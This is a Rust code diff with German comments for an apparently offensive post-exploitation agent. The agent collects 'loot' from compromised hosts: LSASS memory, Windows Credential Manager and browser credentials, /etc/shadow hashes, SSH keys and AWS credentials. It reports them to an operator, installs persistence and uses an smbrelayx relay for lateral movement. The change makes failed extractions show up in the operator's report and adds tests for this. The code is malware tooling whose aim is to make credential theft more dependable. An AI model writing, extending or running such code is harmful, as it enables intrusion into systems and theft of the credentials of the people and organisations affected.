@@ -38,8 +38,9 @@ use crate::Args;
 /// Zwei Adapter stehen dahinter — der Seam ist damit real, nicht hypothetisch.
 #[allow(async_fn_in_trait)]
 pub trait Umgebung {
-    /// Die Stücke, die auf diesem Host liegen.
-    async fn lokale_beute(&self) -> Vec<Secret>;
+    /// Die Stücke, die auf diesem Host liegen — und die Quellen, die nicht
+    /// lesbar waren.
+    async fn lokale_beute(&self) -> LokaleBeute;
 
     /// Die Funde der Netzwerkphase — je Host ein Fund.
     async fn funde_im_netz(&self, entdeckt: &[DiscoveredHost], relay_script: &str)
@@ -54,7 +55,7 @@ pub trait Umgebung {
 pub struct System;
 
 impl Umgebung for System {
-    async fn lokale_beute(&self) -> Vec<Secret> {
+    async fn lokale_beute(&self) -> LokaleBeute {
         sammle_lokale_beute().await
     }
 
@@ -125,14 +126,22 @@ impl<'a, U: Umgebung> Lauf<'a, U> {
 
         // 1. Die eigene Beute sammeln und zusammen mit dem eigenen Host
         //    melden. Der Host kommt zuerst: ohne ihn ist die Beute wertlos.
+        let lokale = self.umgebung.lokale_beute().await;
+        // Die Quellen, die nicht lesbar waren, gehoeren in die Meldung. Ohne
+        // sie haelt der Operator ein Ziel fuer vollstaendig ausgelesen, das es
+        // nicht ist.
+        for grund in &lokale.fehler {
+            warn!("Lokale Beute nicht extrahierbar — {grund}");
+        }
         let eigener_fund = HostFund {
             host_id: host_id.clone(),
             ip: host_id.clone(),
             os: None,
             status: STATUS_AGENT.to_string(),
-            secrets: self.umgebung.lokale_beute().await,
+            secrets: lokale.stuecke,
         };
         let mut ergebnis = meldung::melde(self.port, self.sealer, &[eigener_fund]);
+        ergebnis.beute_nicht_extrahiert = lokale.fehler.len();
 
         // 2. Persistenz installieren.
         match self.install_persistenz().await {
@@ -245,36 +254,74 @@ impl<'a, U: Umgebung> Lauf<'a, U> {
 /// kopierter Blöcke. Die Quelle des Stücks steht im Secret — sie kommt vom
 /// Extraktor, der sie am besten kennt.
 ///
+/// Das Ergebnis der Sammlung: die gefundenen Stücke und die Quellen, die
+/// fehlgeschlagen sind.
+///
+/// Beides gehört zusammen: ein verschluckter Fehler lässt den Operator ein
+/// Ziel für vollständig ausgelesen halten, das es nicht ist.
+#[derive(Debug, Default)]
+pub struct LokaleBeute {
+    /// Die Stücke, die gefunden wurden.
+    pub stuecke: Vec<Secret>,
+    /// Die Quellen, die nicht lesbar waren — mit dem Grund.
+    pub fehler: Vec<String>,
+}
+
 /// Das Versiegeln und das Melden liegen nicht hier, sondern im Modul
 /// [`meldung`]: der Master-Key gehört zum Host, und der Fund — nicht das
 /// einzelne Stück — ist die Einheit, die gemeldet wird.
-async fn sammle_lokale_beute() -> Vec<Secret> {
-    let mut secrets: Vec<Secret> = Vec::new();
+async fn sammle_lokale_beute() -> LokaleBeute {
+    let mut beute = LokaleBeute::default();
     #[cfg(target_os = "windows")]
     {
-        secrets.extend(kx_win::extract_lsass().await.unwrap_or_default());
-        secrets.extend(
-            kx_win::extract_credential_manager()
-                .await
-                .unwrap_or_default(),
+        sammle(&mut beute, "LSASS", kx_win::extract_lsass().await);
+        sammle(
+            &mut beute,
+            "Credential Manager",
+            kx_win::extract_credential_manager().await,
         );
-        secrets.extend(
-            kx_win::extract_browser_credentials()
-                .await
-                .unwrap_or_default(),
+        sammle(
+            &mut beute,
+            "Browser-Credentials",
+            kx_win::extract_browser_credentials().await,
         );
     }
     #[cfg(unix)]
     {
-        secrets.extend(kx_posix::extract_shadow_hashes().await.unwrap_or_default());
-        secrets.extend(kx_posix::extract_ssh_keys().await.unwrap_or_default());
-        secrets.extend(
-            kx_posix::extract_aws_credentials()
-                .await
-                .unwrap_or_default(),
+        sammle(
+            &mut beute,
+            "/etc/shadow",
+            kx_posix::extract_shadow_hashes().await,
+        );
+        sammle(
+            &mut beute,
+            "SSH-Schluessel",
+            kx_posix::extract_ssh_keys().await,
+        );
+        sammle(
+            &mut beute,
+            "AWS-Credentials",
+            kx_posix::extract_aws_credentials().await,
         );
     }
-    secrets
+    beute
+}
+
+/// Nimmt das Ergebnis einer Quelle entgegen — Stücke oder den Grund des
+/// Fehlschlags.
+///
+/// Ein fehlgeschlagener Extraktor ist kein Grund, den Fund zu verwerfen: die
+/// anderen Quellen liefern vielleicht mehr. Der Fehler wird aber **nicht**
+/// verschluckt — er kommt in die Meldung.
+fn sammle<E: std::fmt::Display>(
+    beute: &mut LokaleBeute,
+    quelle: &str,
+    ergebnis: Result<Vec<Secret>, E>,
+) {
+    match ergebnis {
+        Ok(stuecke) => beute.stuecke.extend(stuecke),
+        Err(grund) => beute.fehler.push(format!("{quelle}: {grund}")),
+    }
 }
 
 /// Löst den Pfad des Relay-Skripts auf.
@@ -349,6 +396,30 @@ mod tests {
         }
     }
 
+    /// Eine Umgebung, bei der eine Quelle nicht lesbar war.
+    struct KaputteUmgebung;
+
+    impl Umgebung for KaputteUmgebung {
+        async fn lokale_beute(&self) -> LokaleBeute {
+            LokaleBeute {
+                stuecke: vec![Secret::new("shadow", "root", "hash", "/etc/shadow")],
+                fehler: vec!["LSASS: Zugriff verweigert".into()],
+            }
+        }
+
+        async fn funde_im_netz(
+            &self,
+            _entdeckt: &[DiscoveredHost],
+            _relay_script: &str,
+        ) -> Vec<HostFund> {
+            Vec::new()
+        }
+
+        async fn install_persistenz(&self, _invocation: &Invocation) -> Result<(), String> {
+            Ok(())
+        }
+    }
+
     /// Eine Umgebung, die feste Funde liefert und sonst nichts tut.
     ///
     /// Damit läuft der ganze Ablauf ohne Server, ohne Netz und ohne
@@ -356,8 +427,11 @@ mod tests {
     struct Attrappe;
 
     impl Umgebung for Attrappe {
-        async fn lokale_beute(&self) -> Vec<Secret> {
-            vec![Secret::new("shadow", "root", "hash", "/etc/shadow")]
+        async fn lokale_beute(&self) -> LokaleBeute {
+            LokaleBeute {
+                stuecke: vec![Secret::new("shadow", "root", "hash", "/etc/shadow")],
+                fehler: Vec::new(),
+            }
         }
 
         async fn funde_im_netz(
@@ -418,7 +492,7 @@ mod tests {
             ]
         );
         assert_eq!(ergebnis.hosts_registriert, 2);
-        assert_eq!(ergebnis.beute_gemeldet, 2);
+        assert_eq!(ergebnis.beute_uebertragen, 2);
         assert_eq!(ergebnis.beute_verloren, 0);
         assert!(!ergebnis.fehlgeschlagen());
     }
@@ -449,5 +523,26 @@ mod tests {
         assert_eq!(gefunden, PathBuf::from("assets/smbrelayx.py"));
 
         std::fs::remove_dir_all(&dir).ok();
+    }
+
+    /// Eine Quelle, die nicht lesbar war, erscheint in der Meldung.
+    ///
+    /// Vorher verschwand der Fehler: der Extraktor lieferte `unwrap_or_default()`,
+    /// der Lauf meldete „0 verloren" — und der Operator hielt ein Target fuer
+    /// vollstaendig ausgelesen, das es nicht war.
+    #[tokio::test]
+    async fn eine_nicht_lesbare_quelle_erscheint_in_der_meldung() {
+        let port = Aufzeichner {
+            aufrufe: Mutex::new(Vec::new()),
+        };
+        let umgebung = KaputteUmgebung;
+        let args = args();
+        let lauf = Lauf::new(&args, &port, None, &umgebung);
+        let ergebnis = lauf.start().await;
+        assert_eq!(
+            ergebnis.beute_nicht_extrahiert, 1,
+            "der Fehler ist verschwunden"
+        );
+        assert_eq!(ergebnis.beute_uebertragen, 1, "die lesbaren Stuecke fehlen");
     }
 }
